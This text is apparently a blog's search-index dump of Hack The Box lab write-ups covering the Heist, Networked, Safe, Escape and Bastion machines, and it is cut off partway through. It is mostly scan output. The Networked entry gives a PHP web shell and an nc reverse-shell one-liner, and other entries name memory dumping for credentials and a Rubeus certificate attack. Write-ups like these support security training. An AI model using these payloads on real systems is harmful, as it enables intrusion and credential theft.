http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set | http-methods: |_ Potentially risky methods: TRACE 135/tcp open msrpc Microsoft Windows RPC 445/tcp open microsoft-ds? Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: -30s | smb2-time: | date: 2023-06-24T09:40:31 |_ start_date: N/A | smb2-security-mode: | 311: |_ Message signing enabled but not required Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 63.50 seconds gobuster └─$ gobuster dir -u http://10.10.10.149 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x asp,aspx,php =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.149 [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: asp,aspx,php [+] Timeout: 10s =============================================================== 2023/06/24 11:12:31 Starting gobuster in directory enumeration mode =============================================================== /images (Status: 301) [Size: 150] [--\u0026gt; http://10.10.10.149/images/] /index.php (Status: 302) [Size: 0] [--\u0026gt; login.php] /login.php (Status: 200) [Size: 2058] /Images (Status: 301) [Size: 150] [--\u0026gt; http://10.10.10.149/Images/] /issues.php (Status: 302) [Size: 16] [--\u0026gt; login.php] /css (Status: 301) [Size: 147] [--\u0026gt; http://10.10.10.149/css/] /Index.php (Status: 302) [Size: 0] [--\u0026gt; login.php] /Login.php (Status: 200) [Size: 2058] /js (Status: 301) [Size: 146] [--\u0026gt; http://10.10.10.149/js/] /Issues.php (Status: 302) [Size: 16] [--\u0026gt; login.php] /attachments (Status: 301) [Size: 155] [--\u0026gt; http://10.10.10.149/attachments/] /IMAGES (Status: 301) [Size: 150] [--\u0026gt; http://10.10.10.149/IMAGES/] /INDEX.php (Status: 302) [Size: 0] [--\u0026gt; login.php] /CSS (Status: 301) [Size: 147] [--\u0026gt; http://10.10.10.149/CSS/] /JS (Status: 301) [Size: 146] [--\u0026gt; http://10.10.10.149/JS/] /Attachments (Status: 301) [Size: 155] [--\u0026gt; http://10.10.10.149/Attachments/] /LogIn.php (Status: 200) [Size: 2058] /LOGIN.php (Status: 200) [Size: 2058] Progress: 882180 / 882244 (99.99%) =============================================================== 2023/06/24 11:59:05 Finished =============================================================== Web server If we click Login as guest Foothold Let\u0026rsquo;s open the attachment Now we have 3 possible usernames: hazard, rout3r, admin And 3 passwords, which we need to decrypt Using the online decoder resulted in: $uperP@ssword, Q4)sJu\\Y8qz*A3?d And the john: stealth1agent Let\u0026rsquo;s use crackmapexec to find a correct combination Okay we have creds But they seem to work only for smb Let\u0026rsquo;s see if there are any other users on the box impacket-lookupsid hazard:stealth1agent@10.10.10.149 We now have 3 additional users: Chase, Jason and support Let\u0026rsquo;s run crackmapexec again just in case Use the creds launch evil-winrm Root Let\u0026rsquo;s enumerate for privesc Tried Lazagne, but no results Checked installed programs We see Firefox Let\u0026rsquo;s check if it\u0026rsquo;s running During enumeration process with gobuster that we have login.php Let\u0026rsquo;s check that file located in c:\\inetpub\\wwwroot We see that the password hash is hardcoded We see the params that we can use to grep from memory dump (we could also send a request and check params from the browser or proxy) We can use procdump64 to dump the firefox memory Or mimikittenz Or Out-Minidump from Powersploit Let\u0026rsquo;s grep the parameters from the memory dump We got password for administrator Use evil-winrm Rooted ","date":"June 23, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/heist/images/heist.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/heist/","summary":"Heist Enumeration nmap └─$ nmap -sC -sV -Pn 10.10.10.149 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-24 10:40 BST Nmap scan report for 10.10.10.149 (10.10.10.149) Host is up (0.10s latency). Not shown: 997 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 | http-title: Support Login Page |_Requested resource was login.php | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set | http-methods: |_ Potentially risky methods: TRACE 135/tcp open msrpc Microsoft Windows RPC 445/tcp open microsoft-ds?","tags":["HTB"],"title":"[HTB] Machine: Heist"},{"categories":null,"contents":"Networked Enumeration nmap └─$ nmap -sC -sV -Pn 10.10.10.146 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-23 17:13 BST Nmap scan report for 10.10.10.146 (10.10.10.146) Host is up (0.51s latency). Not shown: 921 filtered tcp ports (no-response), 76 filtered tcp ports (host-unreach) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4 (protocol 2.0) | ssh-hostkey: | 2048 2275d7a74f81a7af5266e52744b1015b (RSA) | 256 2d6328fca299c7d435b9459a4b38f9c8 (ECDSA) |_ 256 73cda05b84107da71c7c611df554cfc4 (ED25519) 80/tcp open http Apache httpd 2.4.6 ((CentOS) PHP/5.4.16) |_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16 |_http-title: Site doesn\u0026#39;t have a title (text/html; charset=UTF-8). 443/tcp closed https Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 85.91 seconds gpbuster └─$ gobuster dir -u 10.10.10.146 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x php,html,txt =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.146 [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: php,html,txt [+] Timeout: 10s =============================================================== 2023/06/23 17:21:53 Starting gobuster in directory enumeration mode =============================================================== /.html (Status: 403) [Size: 207] /uploads (Status: 301) [Size: 236] [--\u0026gt; http://10.10.10.146/uploads/] /photos.php (Status: 200) [Size: 1302] /upload.php (Status: 200) [Size: 169] /lib.php (Status: 200) [Size: 0] /backup (Status: 301) [Size: 235] [--\u0026gt; http://10.10.10.146/backup/] /.html (Status: 403) [Size: 207] Web server Backup Foothold Source code Let\u0026rsquo;s try a web shell \u0026lt;?php system($_GET['cmd']); ?\u0026gt; Create a file named shell.php.jpg and add jpg signature via hexeditor https://en.wikipedia.org/wiki/List_of_file_signatures Upload to server Spawn reverse shell rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2\u0026gt;\u0026amp;1|nc 10.10.16.7 6666 \u0026gt;/tmp/f Url encode: rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20%2Di%202%3E%261%7Cnc%2010%2E10%2E16%2E7%206666%20%3E%2Ftmp%2Ff User Enumeration It\u0026rsquo;s a cron job, so we can try command injection since we control the $value Let\u0026rsquo;s create payload file and launch our listener And we got our user Root sudo -l So let\u0026rsquo;s abuse that according to link below https://seclists.org/fulldisclosure/2019/Apr/24 ","date":"June 23, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/networked/images/networked.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/networked/","summary":"Networked Enumeration nmap └─$ nmap -sC -sV -Pn 10.10.10.146 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-23 17:13 BST Nmap scan report for 10.10.10.146 (10.10.10.146) Host is up (0.51s latency). Not shown: 921 filtered tcp ports (no-response), 76 filtered tcp ports (host-unreach) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4 (protocol 2.0) | ssh-hostkey: | 2048 2275d7a74f81a7af5266e52744b1015b (RSA) | 256 2d6328fca299c7d435b9459a4b38f9c8 (ECDSA) |_ 256 73cda05b84107da71c7c611df554cfc4 (ED25519) 80/tcp open http Apache httpd 2.","tags":["HTB"],"title":"[HTB] Machine: Networked"},{"categories":null,"contents":"Safe Enumeration nmap └─$ nmap -sC -sV -Pn 10.10.10.147 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-24 17:07 BST Nmap scan report for 10.10.10.147 (10.10.10.147) Host is up (0.11s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0) | ssh-hostkey: | 2048 6d7c813d6a3df95f2e1f6a97e500bade (RSA) | 256 997e1e227672da3cc9617d74d78033d2 (ECDSA) |_ 256 6a6bc38e4b28f76085b162ff54bcd8d6 (ED25519) 80/tcp open http Apache httpd 2.4.25 ((Debian)) |_http-title: Apache2 Debian Default Page: It works |_http-server-header: Apache/2.4.25 (Debian) 1337/tcp open waste? | fingerprint-strings: | DNSStatusRequestTCP: | 12:07:15 up 1:02, 0 users, load average: 0.07, 0.03, 0.09 | DNSVersionBindReqTCP: | 12:07:10 up 1:02, 0 users, load average: 0.08, 0.03, 0.09 | GenericLines: | 12:06:57 up 1:02, 0 users, load average: 0.10, 0.04, 0.09 | What do you want me to echo back? | GetRequest: | 12:07:03 up 1:02, 0 users, load average: 0.09, 0.04, 0.09 | What do you want me to echo back? GET / HTTP/1.0 | HTTPOptions: | 12:07:04 up 1:02, 0 users, load average: 0.09, 0.04, 0.09 | What do you want me to echo back? OPTIONS / HTTP/1.0 | Help: | 12:07:20 up 1:02, 0 users, load average: 0.06, 0.03, 0.09 | What do you want me to echo back? HELP | NULL: | 12:06:57 up 1:02, 0 users, load average: 0.10, 0.04, 0.09 | RPCCheck: | 12:07:05 up 1:02, 0 users, load average: 0.08, 0.04, 0.09 | RTSPRequest: | 12:07:04 up 1:02, 0 users, load average: 0.09, 0.04, 0.09 | What do you want me to echo back? OPTIONS / RTSP/1.0 | SSLSessionReq, TerminalServerCookie: | 12:07:21 up 1:02, 0 users, load average: 0.06, 0.03, 0.09 | What do you want me to echo back? | TLSSessionReq: | 12:07:22 up 1:02, 0 users, load average: 0.06, 0.03, 0.09 |_ What do you want me to echo back? 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port1337-TCP:V=7.93%I=7%D=6/24%Time=649714C5%P=x86_64-pc-linux-gnu%r(NU SF:LL,3E,\u0026#34;\\x2012:06:57\\x20up\\x20\\x201:02,\\x20\\x200\\x20users,\\x20\\x20load\\x SF:20average:\\x200\\.10,\\x200\\.04,\\x200\\.09\\n\u0026#34;)%r(GenericLines,63,\u0026#34;\\x2012:0 SF:6:57\\x20up\\x20\\x201:02,\\x20\\x200\\x20users,\\x20\\x20load\\x20average:\\x200 SF:\\.10,\\x200\\.04,\\x200\\.09\\n\\nWhat\\x20do\\x20you\\x20want\\x20me\\x20to\\x20ec SF:ho\\x20back\\?\\x20\\r\\n\u0026#34;)%r(GetRequest,71,\u0026#34;\\x2012:07:03\\x20up\\x20\\x201:02, SF:\\x20\\x200\\x20users,\\x20\\x20load\\x20average:\\x200\\.09,\\x200\\.04,\\x200\\.0 SF:9\\n\\nWhat\\x20do\\x20you\\x20want\\x20me\\x20to\\x20echo\\x20back\\?\\x20GET\\x20 SF:/\\x20HTTP/1\\.0\\r\\n\u0026#34;)%r(HTTPOptions,75,\u0026#34;\\x2012:07:04\\x20up\\x20\\x201:02,\\ SF:x20\\x200\\x20users,\\x20\\x20load\\x20average:\\x200\\.09,\\x200\\.04,\\x200\\.09 SF:\\n\\nWhat\\x20do\\x20you\\x20want\\x20me\\x20to\\x20echo\\x20back\\?\\x20OPTIONS\\ SF:x20/\\x20HTTP/1\\.0\\r\\n\u0026#34;)%r(RTSPRequest,75,\u0026#34;\\x2012:07:04\\x20up\\x20\\x201:0 SF:2,\\x20\\x200\\x20users,\\x20\\x20load\\x20average:\\x200\\.09,\\x200\\.04,\\x200\\ SF:.09\\n\\nWhat\\x20do\\x20you\\x20want\\x20me\\x20to\\x20echo\\x20back\\?\\x20OPTIO SF:NS\\x20/\\x20RTSP/1\\.0\\r\\n\u0026#34;)%r(RPCCheck,3E,\u0026#34;\\x2012:07:05\\x20up\\x20\\x201:0 SF:2,\\x20\\x200\\x20users,\\x20\\x20load\\x20average:\\x200\\.08,\\x200\\.04,\\x200\\ SF:.09\\n\u0026#34;)%r(DNSVersionBindReqTCP,3E,\u0026#34;\\x2012:07:10\\x20up\\x20\\x201:02,\\x20\\ SF:x200\\x20users,\\x20\\x20load\\x20average:\\x200\\.08,\\x200\\.03,\\x200\\.09\\n\u0026#34;) SF:%r(DNSStatusRequestTCP,3E,\u0026#34;\\x2012:07:15\\x20up\\x20\\x201:02,\\x20\\x200\\x20 SF:users,\\x20\\x20load\\x20average:\\x200\\.07,\\x200\\.03,\\x200\\.09\\n\u0026#34;)%r(Help, SF:67,\u0026#34;\\x2012:07:20\\x20up\\x20\\x201:02,\\x20\\x200\\x20users,\\x20\\x20load\\x20a SF:verage:\\x200\\.06,\\x200\\.03,\\x200\\.09\\n\\nWhat\\x20do\\x20you\\x20want\\x20me SF:\\x20to\\x20echo\\x20back\\?\\x20HELP\\r\\n\u0026#34;)%r(SSLSessionReq,64,\u0026#34;\\x2012:07:21 SF:\\x20up\\x20\\x201:02,\\x20\\x200\\x20users,\\x20\\x20load\\x20average:\\x200\\.06 SF:,\\x200\\.03,\\x200\\.09\\n\\nWhat\\x20do\\x20you\\x20want\\x20me\\x20to\\x20echo\\x SF:20back\\?\\x20\\x16\\x03\\n\u0026#34;)%r(TerminalServerCookie,63,\u0026#34;\\x2012:07:21\\x20up\\ SF:x20\\x201:02,\\x20\\x200\\x20users,\\x20\\x20load\\x20average:\\x200\\.06,\\x200\\ SF:.03,\\x200\\.09\\n\\nWhat\\x20do\\x20you\\x20want\\x20me\\x20to\\x20echo\\x20back\\ SF:?\\x20\\x03\\n\u0026#34;)%r(TLSSessionReq,64,\u0026#34;\\x2012:07:22\\x20up\\x20\\x201:02,\\x20\\x SF:200\\x20users,\\x20\\x20load\\x20average:\\x200\\.06,\\x200\\.03,\\x200\\.09\\n\\nW SF:hat\\x20do\\x20you\\x20want\\x20me\\x20to\\x20echo\\x20back\\?\\x20\\x16\\x03\\n\u0026#34;); Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 100.88 seconds gobuster └─$ gobuster dir -u http://10.10.10.147 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x html,txt,php =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.147 [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: html,txt,php [+] Timeout: 10s =============================================================== 2023/06/24 16:22:12 Starting gobuster in directory enumeration mode =============================================================== /.html (Status: 403) [Size: 292] /index.html (Status: 200) [Size: 10787] /manual (Status: 301) [Size: 313] [--\u0026gt; http://10.10.10.147/manual/] /.html (Status: 403) [Size: 292] /server-status (Status: 403) [Size: 300] Web server has a hint about the port 1337 Visting path /myapp downloads myapp Let\u0026rsquo;s check port 1337 myapp file Foothold Root ","date":"June 23, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/safe/images/safe.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/safe/","summary":"Safe Enumeration nmap └─$ nmap -sC -sV -Pn 10.10.10.147 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-24 17:07 BST Nmap scan report for 10.10.10.147 (10.10.10.147) Host is up (0.11s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0) | ssh-hostkey: | 2048 6d7c813d6a3df95f2e1f6a97e500bade (RSA) | 256 997e1e227672da3cc9617d74d78033d2 (ECDSA) |_ 256 6a6bc38e4b28f76085b162ff54bcd8d6 (ED25519) 80/tcp open http Apache httpd 2.4.25 ((Debian)) |_http-title: Apache2 Debian Default Page: It works |_http-server-header: Apache/2.","tags":["HTB"],"title":"[HTB] Machine: Safe"},{"categories":null,"contents":"Escape Enumeration nmap ┌──(kali㉿kali)-[~] └─$ nmap -Pn -p53,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,4966,49689,49690,49706,49714,58597 10.10.11.202 -T4 -sC -sV Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-21 09:24 EDT Nmap scan report for 10.10.11.202 (10.10.11.202) Host is up (0.16s latency). PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2023-05-21 21:24:13Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name) |_ssl-date: 2023-05-21T21:25:47+00:00; +7h59m35s from scanner time. | ssl-cert: Subject: commonName=dc.sequel.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:dc.sequel.htb | Not valid before: 2022-11-18T21:20:35 |_Not valid after: 2023-11-18T21:20:35 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=dc.sequel.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:dc.sequel.htb | Not valid before: 2022-11-18T21:20:35 |_Not valid after: 2023-11-18T21:20:35 |_ssl-date: 2023-05-21T21:25:47+00:00; +7h59m35s from scanner time. 1433/tcp open ms-sql-s Microsoft SQL Server 2019 15.00.2000.00; RTM |_ssl-date: 2023-05-21T21:25:46+00:00; +7h59m36s from scanner time. | ms-sql-ntlm-info: | 10.10.11.202:1433: | Target_Name: sequel | NetBIOS_Domain_Name: sequel | NetBIOS_Computer_Name: DC | DNS_Domain_Name: sequel.htb | DNS_Computer_Name: dc.sequel.htb | DNS_Tree_Name: sequel.htb |_ Product_Version: 10.0.17763 | ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback | Not valid before: 2023-05-19T20:14:37 |_Not valid after: 2053-05-19T20:14:37 | ms-sql-info: | 10.10.11.202:1433: | Version: | name: Microsoft SQL Server 2019 RTM | number: 15.00.2000.00 | Product: Microsoft SQL Server 2019 | Service pack level: RTM | Post-SP patches applied: false |_ TCP port: 1433 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name) |_ssl-date: 2023-05-21T21:25:47+00:00; +7h59m35s from scanner time. | ssl-cert: Subject: commonName=dc.sequel.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:dc.sequel.htb | Not valid before: 2022-11-18T21:20:35 |_Not valid after: 2023-11-18T21:20:35 3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=dc.sequel.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:dc.sequel.htb | Not valid before: 2022-11-18T21:20:35 |_Not valid after: 2023-11-18T21:20:35 |_ssl-date: 2023-05-21T21:25:47+00:00; +7h59m36s from scanner time. 4966/tcp filtered unknown 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 9389/tcp open mc-nmf .NET Message Framing 49689/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49690/tcp open msrpc Microsoft Windows RPC 49706/tcp open msrpc Microsoft Windows RPC 49714/tcp open msrpc Microsoft Windows RPC 58597/tcp open msrpc Microsoft Windows RPC Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 311: |_ Message signing enabled and required | smb2-time: | date: 2023-05-21T21:25:07 |_ start_date: N/A |_clock-skew: mean: 7h59m35s, deviation: 0s, median: 7h59m34s Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 102.84 seconds smb We see a pdf file We have the creds in Bonus section Foothold Let\u0026rsquo;s check creds from pdf We have an access So I connected to SQL and tried enumerating it using the hacktricks checklist Checked sql_users Checked linked_servers Then I noticed I got to the part with NTLM and Relay attacks Let\u0026rsquo;s try stealing hash And we get sql_svc\u0026rsquo;s hash Let\u0026rsquo;s crack it Use evil-winrm to connect to box User I spent a significant time enumerating the box to get a user I noticed a SQLServer logs Where we can find user creds Now we get our user Root During enumeration, I noticed user certificates pop up in user\u0026rsquo;s object Moreover the name of the box is Escape, so I thought it could be related to ESC attacks targeting ADCS So let\u0026rsquo;s upload certify and run it to find vulnerable certificate templates Okay, we find one Let\u0026rsquo;s google a bit to find a suitable attack Let\u0026rsquo;s request a certificate, since we have a UserAuthentification Now, we need to convert it to pfx Now we can upload pfx to box and use Rubeus for ptt attack SharpCollection to download Rubeus Let\u0026rsquo;s check tgt We\u0026rsquo;re adminstrator However I could enter Administrator\u0026rsquo;s folders It looks like it doesn\u0026rsquo;t work with evil-winrm So I was able to access them using alternative way with certipy Notice that I sync my time with the time of the box Note: Looks like there was a way to dump the hashes from evil-winrm .\\Rubeus.exe asktgt /user:administrator /certificate:\u0026lt;Certificate\u0026gt; /getcredentials /show /nowrap ","date":"June 17, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/escape/images/escape.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/escape/","summary":"Escape Enumeration nmap ┌──(kali㉿kali)-[~] └─$ nmap -Pn -p53,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,4966,49689,49690,49706,49714,58597 10.10.11.202 -T4 -sC -sV Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-21 09:24 EDT Nmap scan report for 10.10.11.202 (10.10.11.202) Host is up (0.16s latency). PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2023-05-21 21:24:13Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: sequel.","tags":["HTB"],"title":"[HTB] Machine: Escape"},{"categories":null,"contents":"Bastion Enumeration nmap └─$ nmap -Pn -sC -sV 10.10.10.134 -T4 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-17 21:20 BST Nmap scan report for 10.10.10.134 (10.10.10.134) Host is up (0.13s latency). Not shown: 996 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH for_Windows_7.9 (protocol 2.0) | ssh-hostkey: | 2048 3a56ae753c780ec8564dcb1c22bf458a (RSA) | 256 cc2e56ab1997d5bb03fb82cd63da6801 (ECDSA) |_ 256 935f5daaca9f53e7f282e664a8a3a018 (ED25519) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows Host script results: | smb2-time: | date: 2023-06-17T20:20:50 |_ start_date: 2023-06-17T18:27:22 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) |_clock-skew: mean: -40m29s, deviation: 1h09m15s, median: -30s | smb2-security-mode: | 311: |_ Message signing enabled but not required | smb-os-discovery: | OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3) | Computer name: Bastion | NetBIOS computer name: BASTION\\x00 | Workgroup: WORKGROUP\\x00 |_ System time: 2023-06-17T22:20:49+02:00 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 40.14 seconds smbmap └─$ smbmap -H 10.10.10.134 -R -u pentest [+] Guest session IP: 10.10.10.134:445 Name: 10.10.10.134 [-] Work[!] Unable to remove test directory at \\\\10.10.10.134\\Backups\\UEQFPWNJOX, please remove manually Disk Permissions Comment ---- ----------- ------- ADMIN$ NO ACCESS Remote Admin Backups READ, WRITE .\\Backups\\* dr--r--r-- 0 Sun Jun 18 09:58:58 2023 . dr--r--r-- 0 Sun Jun 18 09:58:58 2023 .. fw--w--w-- 116 Tue Apr 16 12:43:19 2019 note.txt fr--r--r-- 0 Fri Feb 22 12:43:28 2019 SDT65CB.tmp dr--r--r-- 0 Sun Jun 18 09:58:58 2023 UEQFPWNJOX dr--r--r-- 0 Fri Feb 22 12:44:02 2019 WindowsImageBackup .\\Backups\\WindowsImageBackup\\* dr--r--r-- 0 Fri Feb 22 12:44:02 2019 . dr--r--r-- 0 Fri Feb 22 12:44:02 2019 .. dr--r--r-- 0 Fri Feb 22 12:45:32 2019 L4mpje-PC .\\Backups\\WindowsImageBackup\\L4mpje-PC\\* dr--r--r-- 0 Fri Feb 22 12:45:32 2019 . dr--r--r-- 0 Fri Feb 22 12:45:32 2019 .. dr--r--r-- 0 Fri Feb 22 12:45:32 2019 Backup 2019-02-22 124351 dr--r--r-- 0 Fri Feb 22 12:45:32 2019 Catalog fr--r--r-- 16 Fri Feb 22 12:44:02 2019 MediaId dr--r--r-- 0 Fri Feb 22 12:45:32 2019 SPPMetadataCache .\\Backups\\WindowsImageBackup\\L4mpje-PC\\Backup 2019-02-22 124351\\* dr--r--r-- 0 Fri Feb 22 12:45:32 2019 . dr--r--r-- 0 Fri Feb 22 12:45:32 2019 .. fr--r--r-- 37761024 Fri Feb 22 12:44:03 2019 9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd fr--r--r-- 5418299392 Fri Feb 22 12:45:32 2019 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd fr--r--r-- 1186 Fri Feb 22 12:45:32 2019 BackupSpecs.xml fr--r--r-- 1078 Fri Feb 22 12:45:32 2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_AdditionalFilesc3b9f3c7-5e52-4d5e-8b20-19adc95a34c7.xml fr--r--r-- 8930 Fri Feb 22 12:45:32 2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_Components.xml fr--r--r-- 6542 Fri Feb 22 12:45:32 2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_RegistryExcludes.xml fr--r--r-- 2894 Fri Feb 22 12:45:32 2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer4dc3bdd4-ab48-4d07-adb0-3bee2926fd7f.xml fr--r--r-- 1488 Fri Feb 22 12:45:32 2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer542da469-d3e1-473c-9f4f-7847f01fc64f.xml fr--r--r-- 1484 Fri Feb 22 12:45:32 2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_Writera6ad56c2-b509-4e6c-bb19-49d8f43532f0.xml fr--r--r-- 3844 Fri Feb 22 12:45:32 2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerafbab4a2-367d-4d15-a586-71dbb18f8485.xml fr--r--r-- 3988 Fri Feb 22 12:45:32 2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerbe000cbe-11fe-4426-9c58-531aa6355fc4.xml fr--r--r-- 7110 Fri Feb 22 12:45:32 2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_Writercd3f2362-8bef-46c7-9181-d62844cdc0b2.xml fr--r--r-- 2374620 Fri Feb 22 12:45:32 2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_Writere8132975-6f93-4464-a53e-1050253ae220.xml .\\Backups\\WindowsImageBackup\\L4mpje-PC\\Catalog\\* dr--r--r-- 0 Fri Feb 22 12:45:32 2019 . dr--r--r-- 0 Fri Feb 22 12:45:32 2019 .. fr--r--r-- 5698 Fri Feb 22 12:45:32 2019 BackupGlobalCatalog fr--r--r-- 7440 Fri Feb 22 12:45:32 2019 GlobalCatalog .\\Backups\\WindowsImageBackup\\L4mpje-PC\\SPPMetadataCache\\* dr--r--r-- 0 Fri Feb 22 12:45:32 2019 . dr--r--r-- 0 Fri Feb 22 12:45:32 2019 .. fr--r--r-- 57848 Fri Feb 22 12:45:32 2019 {cd113385-65ff-4ea2-8ced-5630f6feca8f} C$ NO ACCESS Default share IPC$ READ ONLY Remote IPC .\\IPC$\\* fr--r--r-- 3 Sun Dec 31 23:58:45 1600 InitShutdown fr--r--r-- 4 Sun Dec 31 23:58:45 1600 lsass fr--r--r-- 3 Sun Dec 31 23:58:45 1600 ntsvcs fr--r--r-- 3 Sun Dec 31 23:58:45 1600 scerpc fr--r--r-- 1 Sun Dec 31 23:58:45 1600 Winsock2\\CatalogChangeListener-2fc-0 fr--r--r-- 3 Sun Dec 31 23:58:45 1600 epmapper fr--r--r-- 1 Sun Dec 31 23:58:45 1600 Winsock2\\CatalogChangeListener-1e8-0 fr--r--r-- 3 Sun Dec 31 23:58:45 1600 LSM_API_service fr--r--r-- 3 Sun Dec 31 23:58:45 1600 eventlog fr--r--r-- 1 Sun Dec 31 23:58:45 1600 Winsock2\\CatalogChangeListener-3b8-0 fr--r--r-- 3 Sun Dec 31 23:58:45 1600 atsvc fr--r--r-- 4 Sun Dec 31 23:58:45 1600 wkssvc fr--r--r-- 1 Sun Dec 31 